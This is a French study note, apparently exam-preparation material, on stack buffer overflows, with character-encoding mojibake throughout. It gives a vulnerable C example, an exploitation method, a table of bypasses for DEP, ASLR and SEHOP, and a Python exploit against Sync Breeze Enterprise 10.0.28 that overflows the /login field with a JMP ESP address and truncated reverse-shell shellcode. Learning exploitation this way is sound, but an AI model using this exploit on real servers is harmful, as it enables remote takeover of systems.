
### ğŸ” Analyse technique

  

Le dÃ©passement de tampon sur la pile (stack overflow) consiste Ã  Ã©crire au-delÃ  des limites dâ€™un buffer local allouÃ© sur la pile, jusquâ€™Ã  Ã©craser **lâ€™adresse de retour** dâ€™une fonction. Cette attaque permet un **contrÃ´le direct du flot dâ€™exÃ©cution** via lâ€™EIP/RIP, menant potentiellement Ã  lâ€™exÃ©cution de shellcode.

  

### ğŸ“˜ Code vulnÃ©rable de base

  

```c

int main(int argc, char *argv[]) {

Â  Â  char buffer[64];

Â  Â  strcpy(buffer, argv[1]); // vulnÃ©rabilitÃ© : pas de contrÃ´le de taille

Â  Â  return 0;

}

```


### Visualisation de la pile

```

[ buffer[64] Â  ] Â <- Espace vulnÃ©rable

[ saved EBP Â  Â ]

[ return addr Â ] Â <- EIP que lâ€™on peut Ã©craser

```

### ğŸ› ï¸ MÃ©thodologie d'exploitation

  

1. Crash POC

2. Offset EIP avec `pattern_create`, `pattern_offset`

3. Analyse des badchars

4. Shellcode via `msfvenom`

5. Trouver un JMP ESP (ou crÃ©er une ROP chain)

6. Construction du buffer final

7. Test et obtention du shell

### ğŸ’¥ Exploit : Sync Breeze Enterprise 10.0.28

  

Exploit dâ€™un dÃ©passement de tampon dans une requÃªte POST Ã  `/login`.


```python

#!/usr/bin/python

import socket

import sys

  

try:

Â  Â  server = sys.argv[1]

Â  Â  port = 80

Â  Â  size = 800

  

Â  Â  filler = b"A" * 780

Â  Â  eip = b"\x83\x0c\x09\x10" Â # JMP ESP dans DLL vulnÃ©rable (libspp.dll)

Â  Â  offset = b"C" * 4

Â  Â  nops = b"\x90" * 10

  

Â  Â  shellcode = (

Â  Â  Â  Â  b"\xdd\xc4\xba\x6d\xdc\x1e\xf1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"

Â  Â  Â  Â  b"\x52\x31\x56\x17\x83\xee\xfc\x03\x3b\xcf\xfc..."

Â  Â  )

  

Â  Â  payload = filler + eip + offset + nops + shellcode

Â  Â  content = b"username=" + payload + b"&password=A"

  

Â  Â  buffer = b"POST /login HTTP/1.1\r\n"

Â  Â  buffer += b"Host: " + server.encode() + b"\r\n"

Â  Â  buffer += b"User-Agent: Mozilla/5.0\r\n"

Â  Â  buffer += b"Accept: */*\r\n"

Â  Â  buffer += b"Connection: close\r\n"

Â  Â  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"

Â  Â  buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"

Â  Â  buffer += b"\r\n"

Â  Â  buffer += content

  

Â  Â  print("Sending evil buffer.")

Â  Â  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

Â  Â  s.connect((server, port))

Â  Â  s.send(buffer)

Â  Â  s.close()

Â  Â  print("Done!")

  

except socket.error:

Â  Â  print("Could not connect!")

```

  

### ğŸ”– DÃ©tails techniques


- **Offset EIP** : 780 octets (dÃ©terminÃ© avec mona)

- **JMP ESP** : dans `libspp.dll` (sans ASLR, sans DEP)

- **Badchars** : `\x00\x0a\x0d`

- **Payload** : shell reverse TCP, encodÃ©


### â›”ï¸ Mitigations et contournements
  

| Protection Â  Â | Contournement Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  |

| ------------- | --------------------------------- |

| DEP Â  Â  Â  Â  Â  | ROP + VirtualAlloc Â  Â  Â  Â  Â  Â  Â  Â |

| ASLR Â  Â  Â  Â  Â | Modules statiques sans ASLR Â  Â  Â  |

| SEHOP Â  Â  Â  Â  | POP POP RET dans DLL sans SafeSEH |

| Stack Cookies | Pas prÃ©sent ici (pas de **GS**) Â  |

  
## âš ï¸ Erreurs courantes


- Offset mal calculÃ© â†’ EIP partiellement contrÃ´lÃ©

- Shellcode corrompu (badchars)

- DLL choisie avec ASLR activÃ©

  